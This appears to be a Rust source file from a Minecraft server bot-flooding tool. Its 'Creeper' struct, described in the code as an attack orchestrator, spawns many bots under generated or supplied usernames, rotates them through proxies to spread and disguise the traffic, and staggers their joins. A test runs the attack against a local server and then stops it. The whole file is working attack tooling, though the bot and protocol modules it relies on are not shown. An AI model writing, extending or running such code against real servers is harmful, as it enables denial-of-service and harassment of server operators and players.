use crate::bot::{Bot, BotHandle};
use crate::factory::authenticate;
use crate::options::Options;
use crate::protocol::ProxyInfo;

/// Attack orchestrator — spawns bots with configurable delay, proxy rotation.
pub struct Creeper {
    proxies: Vec<ProxyInfo>,
    names: Vec<String>,
    bots: Vec<BotHandle>,
}

impl Creeper {
    pub fn new() -> Self { Self { proxies: vec![], names: vec![], bots: vec![] } }
    pub fn set_proxies(&mut self, proxies: Vec<ProxyInfo>) { self.proxies = proxies; }
    pub fn set_names(&mut self, names: Vec<String>) { self.names = names; }

    pub async fn start(&mut self, options: Options) {
        let mut handles = Vec::with_capacity(options.amount);
        for i in 0..options.amount {
            let username = if !self.names.is_empty() {
                if self.names.len() <= i {
                    log::warn!("Name list too small, limiting");
                    break;
                }
                self.names[i].clone()
            } else {
                options.bot_name_format.replace("%d", &i.to_string())
            };

            let protocol = match authenticate(options.game_version, &username) {
                Ok(p) => p,
                Err(e) => { log::error!("{}: {}", username, e); continue; }
            };

            let proxy = if !self.proxies.is_empty() {
                Some(self.proxies[i % self.proxies.len()].clone())
            } else { None };

            let opts = options.clone();
            let handle = Bot::spawn(opts, protocol, proxy);
            handles.push(handle);

            if options.join_delay_ms > 0 {
                tokio::time::sleep(tokio::time::Duration::from_millis(options.join_delay_ms)).await;
            }
        }
        self.bots = handles;
    }

    pub async fn stop(&mut self) {
        for mut h in self.bots.drain(..) { h.disconnect("Attack stopped").await; }
    }
}

impl Default for Creeper { fn default() -> Self { Self::new() } }

#[cfg(test)]
mod tests {
    use super::*;
    use crate::protocol::GameVersion;

    #[tokio::test]
    async fn test_start_stop() {
        let mut attack = Creeper::new();
        let opts = Options {
            hostname: "127.0.0.1".into(), port: 25565, amount: 3, join_delay_ms: 10,
            bot_name_format: "Bot-%d".into(), game_version: GameVersion::V1_21_1,
            auto_register: false, max_attempts: 1,
        };
        attack.start(opts).await;
        assert!(!attack.bots.is_empty());
        attack.stop().await;
        assert!(attack.bots.is_empty());
    }
}
